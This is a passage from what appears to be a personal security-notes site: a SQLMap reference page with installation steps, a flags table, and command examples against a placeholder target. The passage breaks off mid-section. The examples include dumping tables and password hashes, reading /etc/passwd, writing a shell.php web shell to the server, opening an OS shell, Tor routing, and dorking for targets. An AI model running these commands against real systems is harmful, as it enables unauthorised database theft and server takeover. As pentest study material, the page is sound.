href="/tools/defense-monitoring/sysmon" class="nav-note " data-astro-cid-gvqsdny3> Sysmon </a><a href="/tools/defense-monitoring/thehive" class="nav-note " data-astro-cid-gvqsdny3> TheHive </a><a href="/tools/defense-monitoring/uncomplicated-firewall-ufw" class="nav-note " data-astro-cid-gvqsdny3> Uncomplicated Firewall UFW </a><a href="/tools/defense-monitoring/windows-defender-firewall" class="nav-note " data-astro-cid-gvqsdny3> Windows Defender Firewall </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Enumeration" class="subcat-label-link " data-astro-cid-gvqsdny3> Enumeration </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/enumeration/crackmapexec" class="nav-note " data-astro-cid-gvqsdny3> CrackMapExec </a><a href="/tools/enumeration/dnsenum" class="nav-note " data-astro-cid-gvqsdny3> DNSenum </a><a href="/tools/enumeration/enum4linux-ng" class="nav-note " data-astro-cid-gvqsdny3> Enum4linux Ng </a><a href="/tools/enumeration/feroxbuster" class="nav-note " data-astro-cid-gvqsdny3> Feroxbuster </a><a href="/tools/enumeration/gobuster" class="nav-note " data-astro-cid-gvqsdny3> Gobuster </a><a href="/tools/enumeration/netexec" class="nav-note " data-astro-cid-gvqsdny3> NetExec </a><a href="/tools/enumeration/nmap" class="nav-note " data-astro-cid-gvqsdny3> Nmap </a><a href="/tools/enumeration/odat" class="nav-note " data-astro-cid-gvqsdny3> ODAT </a><a href="/tools/enumeration/rdp-sec-check" class="nav-note " data-astro-cid-gvqsdny3> RDP Sec Check </a><a href="/tools/enumeration/rpcclient" class="nav-note " data-astro-cid-gvqsdny3> Rpcclient </a><a href="/tools/enumeration/smtp-user-enum" class="nav-note " data-astro-cid-gvqsdny3> SMTP User Enum </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Forensics" class="subcat-label-link " data-astro-cid-gvqsdny3> Forensics </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/forensics/capa" class="nav-note " data-astro-cid-gvqsdny3> CAPA </a><a href="/tools/forensics/inetsim" class="nav-note " data-astro-cid-gvqsdny3> INetSim </a><a href="/tools/forensics/oledumppy" class="nav-note " data-astro-cid-gvqsdny3> Oledumppy </a><a href="/tools/forensics/volatility-3" class="nav-note " data-astro-cid-gvqsdny3> Volatility 3 </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Metasploit" class="subcat-label-link " data-astro-cid-gvqsdny3> Metasploit </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/frameworks/metasploit/metasploit" class="nav-note " data-astro-cid-gvqsdny3> Metasploit </a><a href="/tools/frameworks/metasploit/meterpreter" class="nav-note " data-astro-cid-gvqsdny3> Meterpreter </a><a href="/tools/frameworks/metasploit/msfconsole" class="nav-note " data-astro-cid-gvqsdny3> MSFConsole </a><a href="/tools/frameworks/metasploit/msfvenom" class="nav-note " data-astro-cid-gvqsdny3> MSFVenom </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Network%20Analysis" class="subcat-label-link " data-astro-cid-gvqsdny3> Network Analysis </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/network-analysis/tcpdump" class="nav-note " data-astro-cid-gvqsdny3> TCPDump </a><a href="/tools/network-analysis/wireshark" class="nav-note " data-astro-cid-gvqsdny3> Wireshark </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Osint%20Recon" class="subcat-label-link " data-astro-cid-gvqsdny3> Osint Recon </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/osint-recon/dig" class="nav-note " data-astro-cid-gvqsdny3> Dig </a><a href="/tools/osint-recon/finalrecon" class="nav-note " data-astro-cid-gvqsdny3> FinalRecon </a><a href="/tools/osint-recon/nslookup" class="nav-note " data-astro-cid-gvqsdny3> Nslookup </a><a href="/tools/osint-recon/shodan" class="nav-note " data-astro-cid-gvqsdny3> Shodan </a><a href="/tools/osint-recon/whois" class="nav-note " data-astro-cid-gvqsdny3> WHOIS </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Password%20Attacks" class="subcat-label-link " data-astro-cid-gvqsdny3> Password Attacks </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/password-attacks/hashcat" class="nav-note " data-astro-cid-gvqsdny3> Hashcat </a><a href="/tools/password-attacks/hydra" class="nav-note " data-astro-cid-gvqsdny3> Hydra </a><a href="/tools/password-attacks/johntheripper" class="nav-note " data-astro-cid-gvqsdny3> JohnTheRipper </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Post%20Exploitation" class="subcat-label-link " data-astro-cid-gvqsdny3> Post Exploitation </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/post-exploitation/evil-winrm" class="nav-note " data-astro-cid-gvqsdny3> Evil Winrm </a><a href="/tools/post-exploitation/peass-ng" class="nav-note " data-astro-cid-gvqsdny3> PEASS Ng </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Utilities" class="subcat-label-link " data-astro-cid-gvqsdny3> Utilities </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/utilities/curl" class="nav-note " data-astro-cid-gvqsdny3> Curl </a><a href="/tools/utilities/docker" class="nav-note " data-astro-cid-gvqsdny3> Docker </a><a href="/tools/utilities/rsync" class="nav-note " data-astro-cid-gvqsdny3> Rsync </a><a href="/tools/utilities/sqlplus" class="nav-note " data-astro-cid-gvqsdny3> SQLplus </a><a href="/tools/utilities/telnet" class="nav-note " data-astro-cid-gvqsdny3> Telnet </a><a href="/tools/utilities/xfreerdp" class="nav-note " data-astro-cid-gvqsdny3> Xfreerdp </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Vulnerability%20Scanning" class="subcat-label-link " data-astro-cid-gvqsdny3> Vulnerability Scanning </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/vulnerability-scanning/openvas" class="nav-note " data-astro-cid-gvqsdny3> OpenVAS </a> </div> </div><div class="subcat-group" data-open="true" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Web%20Testing" class="subcat-label-link active" data-astro-cid-gvqsdny3> Web Testing </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/web-testing/ffuf" class="nav-note " data-astro-cid-gvqsdny3> Ffuf </a><a href="/tools/web-testing/nikto" class="nav-note " data-astro-cid-gvqsdny3> Nikto </a><a href="/tools/web-testing/sqlmap" class="nav-note active" data-astro-cid-gvqsdny3> SQLMap </a><a href="/tools/web-testing/wafw00f" class="nav-note " data-astro-cid-gvqsdny3> Wafw00f </a><a href="/tools/web-testing/wenum" class="nav-note " data-astro-cid-gvqsdny3> Wenum </a><a href="/tools/web-testing/wpscan" class="nav-note " data-astro-cid-gvqsdny3> WPScan </a><a href="/tools/web-testing/xsstrike" class="nav-note " data-astro-cid-gvqsdny3> XSStrike </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Burp%20Suite" class="subcat-label-link " data-astro-cid-gvqsdny3> Burp Suite </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/web-testing/burp-suite/burp-intruder" class="nav-note " data-astro-cid-gvqsdny3> Burp Intruder </a><a href="/tools/web-testing/burp-suite/burp-proxy" class="nav-note " data-astro-cid-gvqsdny3> Burp Proxy </a><a href="/tools/web-testing/burp-suite/burp-repeater" class="nav-note " data-astro-cid-gvqsdny3> Burp Repeater </a><a href="/tools/web-testing/burp-suite/burp-scanner" class="nav-note " data-astro-cid-gvqsdny3> Burp Scanner </a><a href="/tools/web-testing/burp-suite/burp-suite" class="nav-note " data-astro-cid-gvqsdny3> Burp Suite </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Owasp%20Zap" class="subcat-label-link " data-astro-cid-gvqsdny3> Owasp Zap </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/web-testing/owasp-zap/owasp-zap" class="nav-note " data-astro-cid-gvqsdny3> OWASP ZAP </a><a href="/tools/web-testing/owasp-zap/zap-fuzzer" class="nav-note " data-astro-cid-gvqsdny3> ZAP Fuzzer </a><a href="/tools/web-testing/owasp-zap/zap-proxy" class="nav-note " data-astro-cid-gvqsdny3> ZAP Proxy </a><a href="/tools/web-testing/owasp-zap/zap-scanner" class="nav-note " data-astro-cid-gvqsdny3> ZAP Scanner </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/labs" class="cat-label-link " data-astro-cid-gvqsdny3> Labs </a> <span class="cat-count" data-astro-cid-gvqsdny3>7</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/labs?filter=Cjca" class="subcat-label-link " data-astro-cid-gvqsdny3> Cjca </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/labs/hackthebox/exams/cjca/cjca-siem-triage" class="nav-note " data-astro-cid-gvqsdny3> CJCA SIEM Triage </a><a href="/labs/hackthebox/exams/cjca/htb-cjca-exam---april-2026" class="nav-note " data-astro-cid-gvqsdny3> HTB CJCA Exam   April 2026 </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/labs?filter=Machines" class="subcat-label-link " data-astro-cid-gvqsdny3> Machines </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/labs/hackthebox/exams/cjca/machines/nix01" class="nav-note " data-astro-cid-gvqsdny3> NIX01 </a><a href="/labs/hackthebox/exams/cjca/machines/nix02" class="nav-note " data-astro-cid-gvqsdny3> NIX02 </a><a href="/labs/hackthebox/exams/cjca/machines/web01" class="nav-note " data-astro-cid-gvqsdny3> WEB01 </a><a href="/labs/hackthebox/exams/cjca/machines/win01" class="nav-note " data-astro-cid-gvqsdny3> WIN01 </a><a href="/labs/hackthebox/exams/cjca/machines/win02" class="nav-note " data-astro-cid-gvqsdny3> WIN02 </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/resources" class="cat-label-link " data-astro-cid-gvqsdny3> Resources </a> <span class="cat-count" data-astro-cid-gvqsdny3>6</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <a href="/resources/common-distros" class="nav-note " data-astro-cid-gvqsdny3> Common Distros </a><a href="/resources/ctf-methodology" class="nav-note " data-astro-cid-gvqsdny3> CTF Methodology </a><a href="/resources/cyber-resources" class="nav-note " data-astro-cid-gvqsdny3> Cyber Resources </a><a href="/resources/github-repositories" class="nav-note " data-astro-cid-gvqsdny3> Github Repositories </a><a href="/resources/obsidian-guides" class="nav-note " data-astro-cid-gvqsdny3> Obsidian Guides </a><a href="/resources/try-hack-me-rooms" class="nav-note " data-astro-cid-gvqsdny3> Try Hack Me Rooms </a> </div> </div> </nav>  <script type="module">document.querySelectorAll(".cat-toggle").forEach(e=>{e.addEventListener("click",()=>{const t=e.closest(".cat-group");t.dataset.open=t.dataset.open==="true"?"false":"true"})});document.querySelectorAll(".subcat-toggle").forEach(e=>{e.addEventListener("click",()=>{const t=e.closest(".subcat-group");t.dataset.open=t.dataset.open==="true"?"false":"true"})});</script> </nav> </div> </aside> <button class="sidebar-toggle" id="sidebar-toggle" aria-label="Toggle sidebar" data-astro-cid-o5gmpz7g>‹</button> <div class="note-gap" data-astro-cid-o5gmpz7g></div> <main class="note-main" data-astro-cid-o5gmpz7g> <div class="note-content" data-astro-cid-o5gmpz7g> <div class="note-meta" data-astro-cid-o5gmpz7g> <span class="note-category" data-astro-cid-o5gmpz7g>tools</span>  </div>    <hr>
+<h2 id="overview">Overview</h2>
+<p>SQLMap is a free, open-source penetration testing tool written in Python that automates detection and exploitation of SQL injection vulnerabilities. It handles detection, fingerprinting, enumeration, data extraction, and — given sufficient privileges — OS-level exploitation including file read/write and interactive shell access. Supports 30+ DBMSes including MySQL, PostgreSQL, MSSQL, Oracle, SQLite, and MariaDB. See <a href="/techniques/SQL-Injection">SQL Injection</a> for technique context on the underlying attack types.</p>
+<h2 id="target--context">Target / Context</h2>
+<p>Web applications with SQL injection vulnerabilities in GET/POST parameters, cookies, headers, or JSON/XML request bodies. Pairs with <a href="/tools/Web-Testing/Burp-Suite/Burp-Suite">Burp Suite</a> to capture and replay complex authenticated requests.</p>
+<hr>
+<h2 id="installation">Installation</h2>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Installation Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sudo apt install sqlmap</code></li>
+</ul>
+<p>Manual install:</p>
+<ul class="callout-list">
+  <li><code>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></li>
+  <li><code>python sqlmap.py</code></li>
+</ul>
+</div>
+</details>
+<hr>
+<h2 id="basic-usage">Basic Usage</h2>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Basic Usage:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/page?id=1" --batch</code></li>
+</ul>
+<code>sqlmap -h</code>    — basic help
+<code>sqlmap -hh</code>   — full advanced help listing all options
+<ul class="callout-list">
+  <li><code>sqlmap --wizard</code></li>
+</ul>
+</div>
+</details>
+<hr>
+<h2 id="flags--options">Flags &#x26; Options</h2>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Flags &#x26; Options:</span></summary>
+<div class="callout-body">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag</th><th>Description</th><th>Example</th></tr></thead><tbody><tr><td><code>-u</code> / <code>—url</code></td><td>Target URL</td><td><code>-u “<a href="http://target.com/page?id=1">http://target.com/page?id=1</a>”</code></td></tr><tr><td><code>-r</code></td><td>Read full HTTP request from file</td><td><code>-r req.txt</code></td></tr><tr><td><code>—data</code></td><td>POST body data</td><td><code>—data ‘uid=1&#x26;name=test’</code></td></tr><tr><td><code>-p</code></td><td>Specific parameter to test</td><td><code>-p uid</code></td></tr><tr><td><code>—cookie</code></td><td>Supply cookie header</td><td><code>—cookie=‘PHPSESSID=abc123’</code></td></tr><tr><td><code>-H</code> / <code>—header</code></td><td>Set custom header</td><td><code>-H ‘X-Forwarded-For: 127.0.0.1’</code></td></tr><tr><td><code>—random-agent</code></td><td>Random User-Agent string</td><td><code>—random-agent</code></td></tr><tr><td><code>—mobile</code></td><td>Imitate smartphone browser</td><td><code>—mobile</code></td></tr><tr><td><code>—method</code></td><td>Override HTTP method</td><td><code>—method=PUT</code></td></tr><tr><td><code>—batch</code></td><td>Non-interactive mode; accept defaults</td><td><code>—batch</code></td></tr><tr><td><code>—dbs</code></td><td>Enumerate all databases</td><td><code>—dbs</code></td></tr><tr><td><code>-D</code></td><td>Target database</td><td><code>-D testdb</code></td></tr><tr><td><code>—tables</code></td><td>List tables in database</td><td><code>—tables -D testdb</code></td></tr><tr><td><code>-T</code></td><td>Target table</td><td><code>-T users</code></td></tr><tr><td><code>-C</code></td><td>Target specific columns</td><td><code>-C name,surname</code></td></tr><tr><td><code>—dump</code></td><td>Dump table records</td><td><code>—dump -T users -D testdb</code></td></tr><tr><td><code>—dump-all</code></td><td>Dump all databases</td><td><code>—dump-all —exclude-sysdbs</code></td></tr><tr><td><code>—dump-format</code></td><td>Output format (HTML or SQLite)</td><td><code>—dump-format=HTML</code></td></tr><tr><td><code>—start</code> / <code>—stop</code></td><td>Row range to dump by ordinal</td><td><code>—start=2 —stop=3</code></td></tr><tr><td><code>—where</code></td><td>WHERE condition filter on dump</td><td><code>—where=“name LIKE ‘f%’“</code></td></tr><tr><td><code>—exclude-sysdbs</code></td><td>Skip system databases</td><td><code>—exclude-sysdbs</code></td></tr><tr><td><code>—schema</code></td><td>Dump full DB schema</td><td><code>—schema</code></td></tr><tr><td><code>—search</code></td><td>Search table/column names by keyword</td><td><code>—search -T user</code></td></tr><tr><td><code>—banner</code></td><td>Get DBMS version banner</td><td><code>—banner</code></td></tr><tr><td><code>—current-user</code></td><td>Get current DB user</td><td><code>—current-user</code></td></tr><tr><td><code>—current-db</code></td><td>Get current database name</td><td><code>—current-db</code></td></tr><tr><td><code>—is-dba</code></td><td>Check if current user has DBA privileges</td><td><code>—is-dba</code></td></tr><tr><td><code>—passwords</code></td><td>Dump and crack DB user passwords</td><td><code>—passwords —batch</code></td></tr><tr><td><code>—all</code></td><td>Full enumeration of everything accessible</td><td><code>—all —batch</code></td></tr><tr><td><code>—level</code></td><td>Scan depth 1–5 (default 1)</td><td><code>—level=5</code></td></tr><tr><td><code>—risk</code></td><td>Risk level 1–3 (default 1); 3 enables OR payloads</td><td><code>—risk=3</code></td></tr><tr><td><code>—technique</code></td><td>Limit to specific injection types (BEUSTQ)</td><td><code>—technique=BEU</code></td></tr><tr><td><code>—prefix</code></td><td>Static prefix to wrap injection vector</td><td><code>—prefix=”%’))“</code></td></tr><tr><td><code>—suffix</code></td><td>Static suffix to wrap injection vector</td><td><code>—suffix=”— -“</code></td></tr><tr><td><code>—union-cols</code></td><td>Force exact column count for UNION injection</td><td><code>—union-cols=3</code></td></tr><tr><td><code>—union-char</code></td><td>Override NULL fill value in UNION</td><td><code>—union-char=‘a’</code></td></tr><tr><td><code>—union-from</code></td><td>Append FROM clause to UNION query</td><td><code>—union-from=dual</code></td></tr><tr><td><code>—no-cast</code></td><td>Disable CAST() wrapping on retrieved data</td><td><code>—no-cast</code></td></tr><tr><td><code>—code</code></td><td>HTTP code that signals TRUE response</td><td><code>—code=200</code></td></tr><tr><td><code>—titles</code></td><td>Detect TRUE/FALSE via <code><title>&#x3C;/code> tag comparison</title>
+</code></td><td>&#x3C;code>—titles&#x3C;/code></td></tr><tr><td><code>—string</code></td><td>String present in TRUE response only</td><td><code>—string=success</code></td></tr><tr><td><code>—text-only</code></td><td>Strip HTML; compare visible text only</td><td><code>—text-only</code></td></tr><tr><td><code>—parse-errors</code></td><td>Display DBMS errors inline during run</td><td><code>—parse-errors</code></td></tr><tr><td><code>-t</code></td><td>Save full traffic to output file</td><td><code>-t traffic.txt</code></td></tr><tr><td><code>-v</code></td><td>Verbosity level 0–6 (3 shows payloads)</td><td><code>-v 3</code></td></tr><tr><td><code>—proxy</code></td><td>Route all traffic through a proxy</td><td><code>—proxy=“<a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a>”</code></td></tr><tr><td><code>—proxy-file</code></td><td>Cycle through a list of proxies</td><td><code>—proxy-file=proxies.txt</code></td></tr><tr><td><code>—tor</code></td><td>Use Tor SOCKS proxy (port 9050/9150)</td><td><code>—tor</code></td></tr><tr><td><code>—check-tor</code></td><td>Verify Tor is reachable before running</td><td><code>—check-tor</code></td></tr><tr><td><code>—csrf-token</code></td><td>Anti-CSRF token parameter name</td><td><code>—csrf-token=“csrf_token”</code></td></tr><tr><td><code>—randomize</code></td><td>Randomize value of a parameter each request</td><td><code>—randomize=rp</code></td></tr><tr><td><code>—eval</code></td><td>Evaluate Python expression before each request</td><td><code>—eval=“import hashlib; h=hashlib.md5(id).hexdigest()“</code></td></tr><tr><td><code>—tamper</code></td><td>Apply tamper script(s)</td><td><code>—tamper=between,randomcase</code></td></tr><tr><td><code>—list-tampers</code></td><td>List all available tamper scripts</td><td><code>—list-tampers</code></td></tr><tr><td><code>—skip-waf</code></td><td>Skip WAF identification (reduce noise)</td><td><code>—skip-waf</code></td></tr><tr><td><code>—chunked</code></td><td>Split POST body into transfer-encoding chunks</td><td><code>—chunked</code></td></tr><tr><td><code>—crawl</code></td><td>Crawl site to discover injection points</td><td><code>—crawl=2</code></td></tr><tr><td><code>—forms</code></td><td>Automatically parse and test forms</td><td><code>—forms</code></td></tr><tr><td><code>-g</code></td><td>Use Google dork to find targets</td><td><code>-g “inurl:id=“</code></td></tr><tr><td><code>—file-read</code></td><td>Read a file from the server filesystem</td><td><code>—file-read “/etc/passwd”</code></td></tr><tr><td><code>—file-write</code></td><td>Local file to write to the server</td><td><code>—file-write shell.php</code></td></tr><tr><td><code>—file-dest</code></td><td>Destination path on the server</td><td><code>—file-dest “/var/www/html/shell.php”</code></td></tr><tr><td><code>—os-shell</code></td><td>Attempt interactive OS shell via SQLi</td><td><code>—os-shell</code></td></tr></tbody></table>
+</div>
+</details>
+<hr>
+<h2 id="common-use-cases">Common Use Cases</h2>
+<h3 id="get-based-testing">GET-based Testing</h3>
+<p>Supply a URL with a GET parameter. SQLMap tests injection points automatically and reports which type succeeded.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/page?id=1" --batch</code></li>
+  <li><code>sqlmap -u "http://target.com/page?id=1" --batch --dbs</code></li>
+  <li><code>sqlmap -u "http://target.com/page?id=1" -D testdb --tables</code></li>
+  <li><code>sqlmap -u "http://target.com/page?id=1" -D testdb -T users --dump</code></li>
+</ul>
+</div>
+</details>
+<h3 id="post-based-testing">POST-based Testing</h3>
+<p>Use <code>--data</code> for inline POST bodies, or mark the injectable parameter with <code>*</code> to restrict testing to that field.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap 'http://target.com/' --data 'uid=1&#x26;name=test' --batch</code></li>
+</ul>
+<code>sqlmap 'http://target.com/' --data 'uid=1*&#x26;name=test' --batch</code>   — asterisk targets uid only
+</div>
+</details>
+<h3 id="full-http-request-file">Full HTTP Request File</h3>
+<p>Use <code>-r</code> for complex requests with many headers, session cookies, or long bodies. Capture from Burp (Save Item) or browser DevTools (Copy → Copy Request Headers). Mark the injectable parameter inside the file with <code>*</code>.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -r req.txt --batch</code></li>
+  <li><code>sqlmap -r req.txt --batch --dbs</code></li>
+  <li><code>sqlmap -r req.txt -D mydb -T users --dump</code></li>
+</ul>
+<p>To pin the injection point inside the file:</p>
+<ul class="callout-list">
+  <li><code>GET /?id=1* HTTP/1.1</code></li>
+</ul>
+</div>
+</details>
+<h3 id="curl-converted-request">cURL-converted Request</h3>
+<p>In browser DevTools → Network tab, right-click a request → Copy as cURL. Replace <code>curl</code> with <code>sqlmap</code> and append flags.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap 'http://target.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Connection: keep-alive' --batch</code></li>
+</ul>
+</div>
+</details>
+<h3 id="json--xml-body-testing">JSON / XML Body Testing</h3>
+<p>SQLMap automatically recognises JSON and XML-formatted POST bodies. No special flag needed — pass via <code>-r</code> or <code>--data</code> and mark the injectable field with <code>*</code> if auto-detection fails.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -r json_req.txt --batch</code></li>
+</ul>
+</div>
+</details>
+<h3 id="basic-db-enumeration">Basic DB Enumeration</h3>
+<p>Run these together after detection to profile the database before dumping data.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --banner --current-user --current-db --is-dba --batch</code></li>
+</ul>
+</div>
+</details>
+<h3 id="table-and-row-enumeration">Table and Row Enumeration</h3>
+<p>Limit output by specifying columns or row ordinals — critical for large tables.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --tables -D testdb</code></li>
+  <li><code>sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb</code></li>
+  <li><code>sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb -C name,surname</code></li>
+  <li><code>sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb --start=2 --stop=3</code></li>
+  <li><code>sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</code></li>
+</ul>
+</div>
+</details>
+<h3 id="schema-and-search">Schema and Search</h3>
+<p>Retrieve the full database structure, or search for tables and columns by keyword across all databases.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
